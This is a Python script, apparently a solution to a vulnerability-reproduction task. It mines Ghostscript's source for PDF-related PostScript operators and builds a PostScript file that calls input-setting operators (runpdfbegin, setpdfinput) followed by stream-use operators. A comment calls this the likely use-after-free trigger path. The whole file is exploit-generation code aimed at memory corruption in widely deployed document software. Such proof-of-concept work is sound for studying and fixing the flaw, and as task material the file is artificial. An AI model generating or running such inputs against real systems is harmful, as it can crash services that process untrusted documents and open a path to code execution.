import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    exts = (".c", ".h", ".hh", ".hpp", ".cc", ".cpp", ".m", ".mm", ".inc", ".ps", ".txt", ".md", ".rst")
    max_size = 8 * 1024 * 1024

    def read_file(path: str) -> Optional[str]:
        try:
            st = os.stat(path)
            if st.st_size > max_size:
                return None
            with open(path, "rb") as f:
                data = f.read()
            return data.decode("utf-8", "ignore")
        except Exception:
            return None

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if not lfn.endswith(exts):
                    continue
                p = os.path.join(root, fn)
                s = read_file(p)
                if s is None:
                    continue
                yield p, s
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                lname = name.lower()
                if not lname.endswith(exts):
                    continue
                if m.size > max_size:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    s = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                yield name, s
    except Exception:
        return


def _collect_op_defs(src_path: str) -> Dict[str, Tuple[int, str]]:
    # returns opname -> (nargs, funcname)
    # Ghostscript style: {"1runpdfbegin", zrunpdfbegin}
    # also captures operator names starting with '.', etc.
    op_re = re.compile(r'\{\s*"([0-9]{1,2})([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
    ops: Dict[str, Tuple[int, str]] = {}
    for _, text in _iter_source_texts(src_path):
        for m in op_re.finditer(text):
            try:
                nargs = int(m.group(1))
            except Exception:
                continue
            name = m.group(2)
            func = m.group(3)
            if not name:
                continue
            # Keep first seen
            if name not in ops:
                ops[name] = (nargs, func)
    return ops


def _ps_escape_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def _score_set(name: str, func: str, nargs: int) -> int:
    n = name.lower()
    f = func.lower()
    sc = 0
    if nargs <= 0 or nargs > 3:
        sc -= 200
    else:
        sc += 10
        if nargs == 1:
            sc += 5
    if "setpdfinput" in n or "setpdfinput" in f:
        sc += 400
    if ("set" in n or "set" in f) and ("pdf" in n or "pdf" in f) and ("input" in n or "stream" in n or "input" in f or "stream" in f):
        sc += 220
    if "pdfi" in n or "pdfi" in f:
        sc += 60
    if "runpdfbegin" in n or "runpdfbegin" in f:
        sc += 180
    if "begin" in n and "pdf" in n:
        sc += 50
    if "stream" in n:
        sc += 20
    if "input" in n:
        sc += 20
    return sc


def _score_use(name: str, func: str, nargs: int) -> int:
    n = name.lower()
    f = func.lower()
    sc = 0
    if nargs > 1 or nargs < 0:
        sc -= 200
    else:
        if nargs == 0:
            sc += 40
        else:
            sc += 10
    if "runpdfend" in n or "runpdfend" in f:
        sc += 400
    if ("end" in n) and ("pdf" in n):
        sc += 120
    if "pdfi" in n or "pdfi" in f:
        sc += 40
    for kw, w in (
        ("tell", 60),
        ("seek", 60),
        ("pos", 40),
        ("offset", 60),
        ("read", 40),
        ("close", 60),
        ("flush", 40),
        ("stream", 30),
        ("input", 20),
    ):
        if kw in n or kw in f:
            sc += w
    return sc


def _score_init(name: str, func: str, nargs: int) -> int:
    n = name.lower()
    f = func.lower()
    sc = 0
    if nargs != 0:
        sc -= 100
    else:
        sc += 30
    if "pdfi" in n or "pdfi" in f:
        sc += 40
    for kw, w in (("init", 80), ("begin", 40), ("context", 60), ("create", 40), ("new", 20), ("start", 20)):
        if kw in n or kw in f:
            sc += w
    return sc


def _select_ops(ops: Dict[str, Tuple[int, str]]) -> Tuple[List[Tuple[str, int]], List[Tuple[str, int]], List[Tuple[str, int]]]:
    # returns (init_ops, set_ops, use_ops) as (name, nargs)
    items = [(name, nargs, func) for name, (nargs, func) in ops.items()]

    init_candidates: List[Tuple[int, str, int]] = []
    set_candidates: List[Tuple[int, str, int]] = []
    use_candidates: List[Tuple[int, str, int]] = []

    for name, nargs, func in items:
        ln = name.lower()
        lf = func.lower()

        if ("pdfi" in ln or "pdfi" in lf) and nargs == 0 and any(k in ln or k in lf for k in ("init", "context", "create", "begin", "start", "new")):
            init_candidates.append((_score_init(name, func, nargs), name, nargs))

        if any(k in ln or k in lf for k in ("setpdfinput", "runpdfbegin", "set_input", "inputstream", "input_stream", "setstream", "set_stream")) or (
            ("set" in ln or "set" in lf) and ("pdf" in ln or "pdf" in lf) and ("input" in ln or "stream" in ln or "input" in lf or "stream" in lf)
        ):
            set_candidates.append((_score_set(name, func, nargs), name, nargs))

        if any(k in ln or k in lf for k in ("runpdfend", "tell", "seek", "offset", "pos", "read", "close", "flush")) and ("pdf" in ln or "pdf" in lf):
            use_candidates.append((_score_use(name, func, nargs), name, nargs))
        elif ("pdfi" in ln or "pdfi" in lf) and any(k in ln or k in lf for k in ("tell", "seek", "offset", "pos", "read", "close", "flush", "stream", "input")):
            use_candidates.append((_score_use(name, func, nargs), name, nargs))

    init_candidates.sort(reverse=True)
    set_candidates.sort(reverse=True)
    use_candidates.sort(reverse=True)

    def dedup_take(cands: List[Tuple[int, str, int]], limit: int, nargs_allow: Optional[Tuple[int, ...]] = None) -> List[Tuple[str, int]]:
        out: List[Tuple[str, int]] = []
        seen = set()
        for _, name, nargs in cands:
            if name in seen:
                continue
            if nargs_allow is not None and nargs not in nargs_allow:
                continue
            seen.add(name)
            out.append((name, nargs))
            if len(out) >= limit:
                break
        return out

    init_ops = dedup_take(init_candidates, 3, nargs_allow=(0,))
    set_ops = dedup_take(set_candidates, 8, nargs_allow=(1, 2, 3))
    use_ops = dedup_take(use_candidates, 10, nargs_allow=(0, 1))

    # Ensure some baseline attempts exist
    baseline_inits: List[Tuple[str, int]] = []
    baseline_sets: List[Tuple[str, int]] = [("runpdfbegin", 1), (".runpdfbegin", 1), ("setpdfinput", 1), (".setpdfinput", 1)]
    baseline_uses: List[Tuple[str, int]] = [("runpdfend", 0), (".runpdfend", 0)]

    def merge(base: List[Tuple[str, int]], lst: List[Tuple[str, int]], max_len: int) -> List[Tuple[str, int]]:
        out = []
        seen = set()
        for nm, na in base + lst:
            if nm in seen:
                continue
            seen.add(nm)
            out.append((nm, na))
            if len(out) >= max_len:
                break
        return out

    init_ops = merge(baseline_inits, init_ops, 4)
    set_ops = merge(baseline_sets, set_ops, 10)
    use_ops = merge(baseline_uses, use_ops, 14)

    return init_ops, set_ops, use_ops


def _emit_call(name: str, nargs: int) -> str:
    sn = _ps_escape_string(name)
    if nargs == 0:
        return f"mark ({sn}) {{ DO0 }} stopped pop cleartomark\n"
    if nargs == 1:
        return f"mark s0 ({sn}) {{ DO1 }} stopped pop cleartomark\n"
    if nargs == 2:
        return f"mark s0 <<>> ({sn}) {{ DO2 }} stopped pop cleartomark\n"
    if nargs == 3:
        return f"mark s0 <<>> 0 ({sn}) {{ DO3 }} stopped pop cleartomark\n"
    # fallback
    return f"mark ({sn}) {{ DO0 }} stopped pop cleartomark\n"


def _build_ps(init_ops: List[Tuple[str, int]], set_ops: List[Tuple[str, int]], use_ops: List[Tuple[str, int]]) -> bytes:
    parts: List[str] = []
    parts.append("%!PS-Adobe-3.0\n")
    parts.append("/DO0{dup cvn where{pop cvn load exec}{pop pop}ifelse}bind def\n")
    parts.append("/DO1{exch dup cvn where{pop exch cvn load exec}{pop pop pop}ifelse}bind def\n")
    parts.append("/DO2{3 1 roll dup cvn where{pop 3 1 roll cvn load exec}{pop pop pop pop}ifelse}bind def\n")
    parts.append("/DO3{4 1 roll dup cvn where{pop 4 1 roll cvn load exec}{pop pop pop pop pop}ifelse}bind def\n")
    parts.append("/s0 currentfile 0 () /SubFileDecode filter def\n")

    for nm, na in init_ops:
        parts.append(_emit_call(nm, na))

    # Try each set op, then immediately try use ops (the likely UAF trigger path).
    for snm, sna in set_ops:
        parts.append(_emit_call(snm, sna))
        for unm, una in use_ops:
            parts.append(_emit_call(unm, una))

    parts.append("quit\n")
    return "".join(parts).encode("latin-1", "ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        ops = _collect_op_defs(src_path)
        init_ops, set_ops, use_ops = _select_ops(ops)
        return _build_ps(init_ops, set_ops, use_ops)